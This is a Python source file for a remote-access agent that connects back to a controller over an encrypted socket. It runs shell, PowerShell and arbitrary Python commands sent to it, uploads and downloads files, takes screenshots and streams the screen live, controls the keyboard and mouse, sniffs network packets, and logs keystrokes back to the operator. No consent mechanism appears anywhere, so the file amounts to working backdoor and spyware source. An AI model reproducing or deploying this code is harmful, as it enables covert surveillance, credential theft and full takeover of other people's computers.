import base64
import json
import socket
import threading
import time
from typing import Callable
import os
import struct
import subprocess
import pynput.keyboard
from rsa import rsa
import hashlib
from DHE.my_hmac import HMAC
from aes.aes_types import CTR
import hmac
import cv2
import numpy as np
import pyautogui
from pynput.keyboard import Listener, Key
from pynput.mouse import Button
from scapy.all import sniff
from scapy.utils import wrpcap
from Crypto.Cipher import AES
from Crypto.Util import Counter
import mss
from mysql.engine import Engine
from mysql.query import Select, Field, Table, Create, Insert, Update,Delete

special_keys = {
    "enter": Key.enter,
    "esc": Key.esc,
    "space": Key.space,
    "tab": Key.tab,
    "shift": Key.shift,
    "ctrl": Key.ctrl,
    "alt": Key.alt,
    "backspace": Key.backspace,
    "delete": Key.delete,
    "up": Key.up,
    "down": Key.down,
    "left": Key.left,
    "right": Key.right,
}
def cmd(command:str) ->bytes:
    return os.popen(command).read().encode()

def powershell(command:str) ->bytes:
    result = subprocess.run(["powershell","-Command",command],capture_output=True)
    return result.stdout

def python(code:str)->bytes:
    try:
        exec(code)
        return "successfully ran your code on the worker".encode()
    except Exception as e:
        return f"error in execution: {e}".encode()

def send_file(file_str: bytes) ->bytes:
    data = file_str.split(b":",1)
    file_name:str = data[0].decode()
    file_bytes:bytes =data[1]
    try:
        with open(file_name, "wb") as file:
            file.write(file_bytes)
            return "successfully sent the file".encode()
    except IOError as e:
        return f"error writing the file: {e}".encode()

def press_key_in_worker(key_data:str)->bytes:
    data = key_data.split(":")
    type = data[0]
    key_name = data[1]
    key = special_keys.get(key_name.lower(), key_name)
    keyboard = pynput.keyboard.Controller()
    if type == "down":
        keyboard.press(key)
    else:
        keyboard.release(key)
    return f"{key} was pressed successfully".encode()

def receive_file(file_name:str)->bytes:
    try:
        with open(file_name,"rb") as file:
            file_bytes = file.read()
        return file_bytes
    except FileNotFoundError:
        return f"error: file '{file_name}'does not exist".encode()
    except PermissionError:
        return f"error: file '{file_name}' is not accessible".encode()
    except Exception as e:
        return f"error: {e}".encode()

def screen_shot(doesnt_matter:str)->bytes:
    s_shot = pyautogui.screenshot()
    s_shot.save("screen_shot.png")
    with open("screen_shot.png","rb") as file:
        decoded_img = file.read()
    return decoded_img

def map_button_name(name:str):
    n = name.lower()
    if n == "left":
        return Button.left
    if n == "right":
        return Button.right
    if n == "middle":
        return Button.middle

def control_mouse(parameters:bytes) -> bytes:
    mouse = pynput.mouse.Controller()
    payload = json.loads(parameters.decode('utf-8'))
    typ = payload.get("type")
    if typ == "button":
        action = payload.get("action", "").lower()
        btn_name = payload.get("button", "left")
        btn = map_button_name(btn_name)
        if action in "down":
            mouse.press(btn)
        elif action in "up":
            mouse.release(btn)
    elif typ == "wheel":
        delta = float(payload.get("delta", 0))
        mouse.scroll(0, int(delta))
    elif typ == "move_abs":
        x = int(payload.get("x", 0))
        y = int(payload.get("y", 0))
        mouse.position = (x, y)
    return b"mouse was moved successfully"

def sniff_from_worker(parameters:str) -> bytes:
    data = parameters.split(":")
    scapy_filter = data[0]
    scapy_time = int(data[1])
    scapy_amount = int(data[2])
    packets = sniff(filter=scapy_filter,timeout=scapy_time,count= scapy_amount)
    wrpcap("packets.pcap",packets)
    with open("packets.pcap", "rb") as file:
        pcap_bytes = file.read()
    return pcap_bytes

def live_stream(doesnt_matter:str) -> bytes:
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        frame = np.array(sct.grab(monitor))
        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
        return buffer.tobytes()


class Worker:
    def __init__(self, ip:str, port:int):
        functions: dict[str, Callable[[str], bytes]] = {"cmd": cmd,
                                                        "powershell": powershell,
                                                        "python": python,
                                                        "send_file": send_file,
                                                        "receive_file": receive_file,
                                                        "screen_shot": screen_shot,
                                                        "press_key_in_worker": press_key_in_worker,
                                                        "control_mouse": control_mouse,
                                                        "sniff_from_worker": sniff_from_worker,
                                                        "live_stream": live_stream}
        self.address = (ip,port)
        self.functions = functions
        self.client = socket.socket()
        self.stream_client = socket.socket()
        self.private_key, self.public_key = rsa.rsa_keys(rsa.distant_random_primes(1024))
        self.rsa = rsa.RSA(my_public_key=self.public_key, my_private_key=self.private_key)
        self.own_master_key = os.urandom(16).hex().encode()
        print(self.own_master_key)
        self.peer_master_key = None
        self._sock_lock = threading.RLock()
        self.key_listener = Listener(on_press=self.on_press)
        engine = Engine().open("users.db")
        self.name_field = Field("name",str,primary=True)
        self.admin_field = Field("admin",bool,nullable=True)
        self.password_field = Field("password",str)
        self.users_table = Table("users",(self.name_field,self.password_field,self.admin_field))
        create = Create(self.users_table,exists_ok=True)
        engine.execute(create)
        engine.execute(Delete(self.users_table))
        engine.commit()
        self.pepper = os.urandom(32)



    def on_press(self,key):
        with self._sock_lock:
            self.sender(f"{key} was pressed".encode())

    def listen_to_keys(self):
        if not self.key_listener.running:
            self.key_listener.start()
    def stop_listen_to_keys(self):
        self.key_listener.stop()
        self.key_listener.join()
        self.key_listener = Listener(on_press=self.on_press)

    def connect(self):
        while True:
            try:
                self.client.connect(self.address)
                self.client.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)

                self.sender(self.rsa.dump_my_public_key(),seal=False)
                self.rsa.load_peer_public_key(self.receiver(open_seal=False))
                self.sender(self.rsa.send(self.own_master_key, hashlib.sha256(self.own_master_key).digest()), seal=False)
                self.stream_client.connect((self.address[0],self.address[1]+1))
                self.peer_master_key = self.rsa.receive(self.receiver(open_seal=False)).encode()
                print(self.peer_master_key)

                print("connection succeeded")
                break
            except(socket.timeout,socket.error)as e:
                print(f"connection failed, error:{e}")
                self.client.close()
                time.sleep(5)
                self.client = socket.socket()

    def derive_own_keys(self):
        enc = hashlib.sha256(b"ENC" + self.own_master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.own_master_key).digest()
        return enc, mac

    def derive_peer_keys(self):
        enc = hashlib.sha256(b"ENC" + self.peer_master_key).digest()[:16]
        mac = hashlib.sha256(b"MAC" + self.peer_master_key).digest()
        return enc, mac

    def receiver(self, stream: bool = False, open_seal: bool = True, my_enc:bool = False) -> bytes:
        if stream:
            sock = self.stream_client
        else:
            sock = self.client

        size = self.recvall(sock, 4)
        if not size:
            return b""
        size = struct.unpack("I", size)[0]
        if size < 1 + 4 + 8 + 32:
            return b"error: Truncated message"
        blob = self.recvall(sock, size)
        if open_seal:
            aes_key, mac_key = self.derive_peer_keys()
            aad = blob[0:4]
            nonce = blob[4:12]
            tag = blob[-32:]
            c = blob[12:-32]
            header = aad + nonce
            to_mac = header + c
            if not my_enc:
                calc = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
            else:
                calc = HMAC("sha256",to_mac,mac_key,32)
            if not hmac.compare_digest(calc, tag):
                return b"error: Authentication failed"
            if not my_enc:
                ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
                return AES.new(aes_key, AES.MODE_CTR,counter=ctr).decrypt(c)
            else:
                ctr = CTR(aes_key,nonce)
                return ctr.decrypt(c)
        else:
            return blob

    def sender(self, message: bytes, stream: bool = False, seal: bool = True, my_enc:bool = False):
        if stream:
            client_sock = self.stream_client
        else:
            client_sock = self.client
        if seal:
            aes_key, mac_key = self.derive_own_keys()
            nonce = os.urandom(8)
            if not my_enc:
                ctr = Counter.new(128, initial_value=int.from_bytes(nonce))
                c = AES.new(aes_key, AES.MODE_CTR, counter=ctr).encrypt(message)
                header = struct.pack("I", len(message)) + nonce
                to_mac = header + c
                tag = hmac.new(mac_key, to_mac, hashlib.sha256).digest()
            else:
                ctr = CTR(aes_key, nonce)
                c = ctr.encrypt(message)
                header = struct.pack("I", len(message)) + nonce
                to_mac = header + c
                tag = HMAC("sha256", to_mac, mac_key, 32)
            data = struct.pack("I", len(header + c + tag)) + header + c + tag
        else:
            data = struct.pack("I", len(message)) + message
        client_sock.sendall(data)

    def recvall(self,sock: socket.socket, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return b""
            data += packet
        return data

    def sign_up(self, user:str, password:str) -> str:
        salt = os.urandom(16)
        hashed_password = hashlib.sha256(self.pepper + salt + password.encode()).digest()
        try:
            self.write_user(user,f"sha256${base64.b64encode(salt).decode()}${base64.b64encode(hashed_password).decode()}")
            return "You have registered successfully"
        except Exception as e:
            return str(e)

    def update(self, user: str, password: str) -> str:
        salt = os.urandom(16)
        hashed_password = hashlib.sha256(self.pepper + salt + password.encode()).digest()
        try:
            self.update_user(user,
                            f"sha256${base64.b64encode(salt).decode()}${base64.b64encode(hashed_password).decode()}")
            return "You have registered successfully"
        except Exception as e:
            return str(e)

    def update_user(self, user:str, digest:str):
        engine = Engine().open("users.db")
        engine.execute(Update(self.users_table).set({"name":user,"password":digest,"admin":False}).where(self.admin_field == 0))
        engine.commit()
    def write_user(self, user:str, digest:str):
        engine = Engine().open("users.db")
        for t in engine.execute(Select(self.users_table)):
            if t["name"] == user:
                engine.commit()
                raise Exception("user already taken choose a different one")
        engine.execute(Insert(self.users_table).values([{self.name_field: user, self.password_field: digest, self.admin_field: False}]))
        engine.commit()

    def login(self,command:str) -> bytes:
        engine = Engine().open("users.db")
        s = command.split(":")
        user = s[0]
        password = s[1]
        try:
            hash_fn_name, salt, hashed_password = self.read_user(user).split("$")
            h = hashlib.sha256(self.pepper + base64.b64decode(salt) + password.encode()).digest()
            if hashed_password == base64.b64encode(h).decode():
                select = Select(self.users_table).each(self.name_field).where((self.name_field == user))
                temp = list[engine.execute(select)][0]
                engine.commit()
                if temp["admin"] == 1:
                    return b"admin"
                else:
                    return b"user"
            else:
                b"login failed"
        except Exception as e:
            engine.commit()
            return b"user not found, try searching for a different one"

    def read_user(self,user: str) -> str:
        engine = Engine().open("users.db")
        select = Select(self.users_table)
        users = engine.execute(select)
        engine.commit()
        for t in users:
            if t["name"] == user:
                return t["password"]
        raise Exception("user not found, try searching for a different one")

    def is_empty(self):
        engine = Engine().open("users.db")
        select = Select(self.users_table)
        users = engine.execute(select)
        engine.commit()
        return users == []

    def run(self):
        self.connect()
        while True:
            data = self.receiver()
            if data == b"quit":
                break

            if b":" in data:
                splitted = data.split(b":",1)
                name = splitted[0].decode()
                commend = splitted[1]
            else:
                name = data.decode()
                commend = b"doesnt matter"
            if name not in ["send_file","control_mouse"]:
                commend = commend.decode()
            if name == "listen_to_keys":
                self.listen_to_keys()
                continue
            if name == "stop_listen_to_keys":
                self.stop_listen_to_keys()
                self.sender(b"stopped_listening")
                continue
            if name == "login":
                message = self.login(commend)
            else:
                message = self.functions[name](commend)
            if name not in ["control_mouse", "press_key_in_worker", "live_stream", "stop_stream", "listen_to_keys", "stop_listen_to_keys"]:
                with self._sock_lock:
                    self.sender(message)
            elif name == "live_stream":
                self.sender(message,stream=True)
        self.client.close()







